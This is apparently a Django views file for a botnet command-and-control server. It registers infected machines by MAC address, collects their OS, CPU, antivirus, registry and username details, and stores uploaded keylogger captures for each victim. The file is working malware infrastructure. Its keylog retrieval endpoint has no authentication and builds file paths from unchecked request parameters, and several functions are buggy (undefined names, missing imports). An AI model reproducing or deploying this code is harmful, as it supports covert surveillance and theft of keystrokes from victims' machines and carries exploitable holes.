from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse
import json
import re
import StringIO

#imports and set environmental variables
import sqlite3
import os
os.environ.setdefault('DJANGO_SETTINGS_MODULE','admin_ui_project.settings')

#setup django
import django
django.setup()

#import botmaster database models
from database.models import System_Information, Antivirus, Connection, Keylogging, Location, Registry, User

#global database variabless
conn = None     #database connection
botinfo = None  #database iterator
THRESHOLD = 8   #max number of connections for the day, anything more is suspicious

########################################## START API
#These APIs are utilized by by the bots to store and retrieve information

@csrf_exempt
# mac_address, ip_address[optional]
def connect_in(request):
    #NO MAC_ADDRESS
    if 'mac_address' not in request.GET:
        return HttpResponse(400)
    #MAC_ADDRESS
    else:
        mac_address = request.GET['mac_address']
        sys_information = getSystemInformation(mac_address)
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.GET:
            if(isIpValid(request.GET['ip_address'])):
                ip_address = request.GET['ip_address']
        #OLD BOT
        if(sys_information!=None):
            #if mac_address is allowed to connections
            if(sys_information[3]):
                #if connection count is over threshold
                if(getConnectionCount(mac_address) > THRESHOLD):
                    #change connection status to false
                    updateConnectionAllowed(mac_address, False)
                    return HttpResponse(400)
                #if connection count it less threshold
                else:
                    #add connection
                    insertConnection(mac_address,ip_address,'/api/connect_in/')
                    #return some sort of action
                    return HttpResponse("you are old, here is an action")
            #else, if connection status is false
            else:
                #mac_address is denied from connections
                return HttpResponse(400)
        #NEW BOT
        else:
            #VALID MAC_ADDRESS
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)                        #add new mac_address
                insertConnection(mac_address,ip_address,'/api/connect_in/') #add connection
                return HttpResponse("you are new, here is an action")
            #INVALID MAC_ADDRESS
            else:
                return HttpResponse(400)

#DONE
@csrf_exempt
# mac_address, os, ip_address[optional]
def add_os(request):
    if(request.method == 'POST'):
        #parameters do not match
        print request.POST
        if 'mac_address' not in request.POST or 'os' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        op_sys = request.POST['os']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        updateOS(mac_address, op_sys)                           #update os
        insertConnection(mac_address,ip_address,'/api/add_os/') #add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, cpu, ip_address[optional]
def add_cpu(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'cpu' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        cpu = request.POST['cpu']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        updateCPU(mac_address, cpu)                              #update cpu
        insertConnection(mac_address,ip_address,'/api/add_cpu/') #add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, antivirus, ip_address[optional]
def add_antivirus(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'antivirus' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        antivirus = request.POST['antivirus']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertAntivirus(mac_address, antivirus)                       #add antivirus
        insertConnection(mac_address,ip_address,'/api/add_antivirus/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, registry, ip_address[optional]
def add_registry(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'registry' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        registry = request.POST['registry']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertRegistry(mac_address, registry)                        #add registry
        insertConnection(mac_address,ip_address,'/api/add_registry/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, username, ip_address[optional]
def add_username(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'username' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        username = request.POST['username']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertUsername(mac_address, username)                       #add username
        insertConnection(mac_address,ip_address,'/api/add_username/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, file(attatched to post), ip_address[optional]
def add_keylogging(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'file' not in request.FILES:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(300)
        #make sure that mac_address exists before entering file
        if(getSystemInformation(mac_address)!=None):
            handle_uploaded_file(mac_address, request.FILES['file'])
            insertConnection(mac_address,ip_address,'/api/add_keylogging/')
        return HttpResponse(200)
#DONE ^^
def handle_uploaded_file(mac_address, f):
    #count files in directory
    #filename = len([f for f in os.walk("./keylogging/").next()[2] if f[-4:] == ".txt"]) + 1
    file_count = 1
    #filename = len([name for name in os.listdir("C://Users/Administrator/admin_ui_project/database/keylogging") if os.path.isfile(name)]) + 1
    #check if file is an acceptable name, increment name if not valid
    while(insertKeylogging(mac_address, mac_address+"---"+str(file_count)) == 0):
        file_count = file_count + 1
    #check if directory exists, create if not
    try:
        os.stat("./database/keylogging/"+mac_address)
    except:
        os.mkdir("./database/keylogging/"+mac_address) 
    #open file within the keylogging folder
    filename = "./database/keylogging/"+mac_address+"/"+mac_address + '---' +str(file_count)+".txt"
    destination = open(filename, 'w')
    for chunk in f.chunks():
        #write file
        destination.write(chunk)
    #close file
    destination.close()

#WORRY ABOUT AUTHENTICATION FOR THIS GET REQUEST. WE DONT WANT PEOPLE TO USE IT.
@csrf_exempt
def get_keylogging(request):
    if 'filename' and 'mac_address' not in request.GET:
        return HttpResponse(400)
    else:
        with open('./database/keylogging/'+request.GET['mac_address']+'/'+request.GET['filename']+'.txt', 'r') as f:
            return HttpResponse(f.read())
########################################## END API

########################################## START DATABASE
#connect the database
def connect():
    global botinfo,conn
    conn = sqlite3.connect('C:\Users\Administrator\\admin_ui_project\db.sqlite3')
    #actions = sqlite3.connect(actions.sqlite3)
    botinfo = conn.cursor()
    return 1

#disconnect the database
def disconnect():
    global conn
    conn.close()
########################################## END DATABASE

########################################## GET INFORMATION
#Database get query functions which are utilized by the APIs

# mac address, os, cpu , connection allowed
def getSystemInformation(mac_address):
    #get system information for a specified mac address
    connect()
    botinfo.execute("SELECT mac_address,op_system,cpu,connection_allowed FROM database_system_information WHERE mac_address=?",(mac_address,))
    data = botinfo.fetchone()
    disconnect()
    return data

# mac address, username
def getUsernames(mac_address):
    #get all associated username to a specified mac address
    connect()
    botinfo.execute("SELECT mac_address_id,username FROM database_user WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, antivirus
def getAntiviruses(mac_address):
    #get all associated antivirus programs detected for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,antivirus_detected FROM database_antivirus WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, registry
def getRegistries(mac_address):
    #get all associated registries detected for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,registry FROM database_registry WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, ip address, timestamp of total connections
def getConnections(mac_address):
    #get all connections made for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, ip address, timestamp of daily connections
def getDailyConnections(mac_address):
    #get only today's connections made by a mac address
    connect()
    today = datetime.date.today()
    format = '%Y-%m-%d'
    epoch = int(time.mktime(time.strptime(str(today),format)))
    tomorrow = epoch + 86400
    tomorrow = time.strftime('%Y-%m-%d', time.localtime(tomorrow))
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=? AND timestamp BETWEEN ? AND ?",(mac_address,today,tomorrow,))
    data = botinfo.fetchall()
    disconnect()
    return data

# returns the number of connections made today for 
def getConnectionCount(mac_address):
    connectionArray = getDailyConnections(mac_address)
    return len(connectionArray)

#could need to be changed
# mac address, ip address, location
def getLocationFromMac(mac_address):
    #get all locations associated with a mac_address
    result = []
    #get ips associated with a mac address
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE mac_address_id=?",(mac_address,))
    for entry in query.fetchall():
        #get locations associated with all ip addresses
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            #build array of all locations associated with mac address
            result.insert(len(result),(mac_address,entry[1],entry2[0]))
    return result

# ip address, location
def getLocationFromIp(ip_address):
    #get all locations associated with an ip address
    result = []
    #get entries from connection table associated with ip
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE ip_address=?",(ip_address,))
    for entry in query.fetchall():
        #get locations associated with ip address
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            #build array of all locations associated with ip address
            result.insert(len(result),(entry[1],entry2[0]))
    return result

# mac address, keylog file name
def getKeyloggings(mac_address):
    #get all keylogging entries associated with a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,filename,timestamp FROM database_keylogging WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data
################################### END GET INFORMATION

################################### INSERT INFORMATION
#Database insert query functions which are utilized by the APIs

def insertSystemInformation(mac_address, op_system='None', cpu='None',  connection_allowed=True):
    #convert boolean to integer
    if(connection_allowed==True):
        connection_allowed=1
    else:
        connection_allowed=0
    #mac address does not exist
    if(getSystemInformation(mac_address)==None):
        #add system information
        obj = System_Information(mac_address=mac_address,op_system=op_system,cpu=cpu,connection_allowed=connection_allowed)
        obj.save()

def insertAntivirus(mac_address,antivirus_detected):
    #invalid antirivus
    if(antivirus_detected == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        #add antivirus
        for x in getAntiviruses(mac_address):
            #registry already exists
            if x[1] == antivirus_detected:
                return -1
        #registry does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Antivirus(mac_address=sys_info,antivirus_detected=antivirus_detected)
        obj.save()

def insertConnection(mac_address, ip_address='xxx.xxx.xxx.xxx', connection_type='NA'):
    #invalid ip_address
    if(ip_address == None or len(mac_address)!=17):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        #add connection
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Connection(mac_address=sys_info,ip_address=ip_address,connection_type=connection_type)
        obj.save()

#NEEDS WORK
def insertLocation(ip_address,location):
    #invalid location
    if(location == None):
        return -1
    #ip_address exists in connection table
    ip_addr = Connection.objects.filter(ip_address=ip_address)[0]
    if(ip_addr!=None):
        #add location
        obj = Location(ip_address=ip_addr,country=location)
        obj.save()

def insertRegistry(mac_address,registry):
    #registry is invalid
    if(registry == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getRegistries(mac_address):
            #registry already exists
            if x[1] == registry:
                return -1
        #registry does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Registry(mac_address=sys_info,registry=registry)
        obj.save()

def insertKeylogging(mac_address, filename):
    #filename is invalid
    if(filename == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getKeyloggings(mac_address):
            #filename already exists
            if x[1] == str(filename):
                return 0
        #filename does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Keylogging(mac_address=sys_info,filename=filename)
        obj.save()
        return 1

def insertUsername(mac_address, username):
    #username is invalid
    if(username == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getUsernames(mac_address):
            #username already exists
            if x[1] == username:
                return -1
        #username does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = User(mac_address=sys_info,username=username)
        obj.save()

################################### END INSERT INFORMATION

################################### START UPDATE INFORMATION
#Database update query functions which are utilized by the APIs

def updateOS(mac_address, op_sys):
    #update os for mac address
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.op_system == 'None'):
            sys_info.op_system = op_sys
            sys_info.save()

def updateCPU(mac_address, cpu):
    #update cpu for mac address
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.cpu == 'None'):
            sys_info.cpu = cpu
            sys_info.save()

def updateConnectionAllowed(mac_address,connection_allowed):
    #update connection allowed for mac address
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = connection_allowed
    sys_info.save()

def toggleConnectionAllowed(mac_address):
    #toggle connection true/false
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = not(sys_info.connection_allowed)
    sys_info.save()

################################## END UPDATE INFORMATION

################################## START OTHER
#Other functions are placed here

#Checks if a mac_address meets a certain format
def isMacValid(mac_address):
    if(len(mac_address)!=17):
        return False
    if(mac_address[2]=='-' and mac_address[5]=='-' and mac_address[8]=='-' and mac_address[11]=='-' and mac_address[14]=='-'):
        return True
    else:
        return false

#Checks if an ip_address meets a certain format
def isIpValid(ip_address):
    reg = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if(reg.match(ip_address)):
        return True
    else:
        return False
################################## END OTHER